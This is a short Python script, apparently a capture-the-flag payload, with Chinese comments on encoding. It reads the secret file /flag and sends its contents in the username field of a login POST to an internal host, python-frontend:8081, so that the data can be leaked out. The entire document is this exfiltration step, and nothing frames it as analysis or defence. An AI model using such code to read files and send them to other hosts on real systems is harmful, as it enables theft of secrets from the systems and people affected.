import urllib.request
import urllib.parse


with open("/flag","r") as f:
    user = "".join(f.readlines())
data = {
    'username': user,
    'password': '123'
}

data = urllib.parse.urlencode(data)  # 编码成urlencoded格式
data = data.encode('ascii')  # 转成bytes类型

url = 'http://python-frontend:8081/login'

req = urllib.request.Request(url, data)
with urllib.request.urlopen(req) as response:
    print(response.read().decode())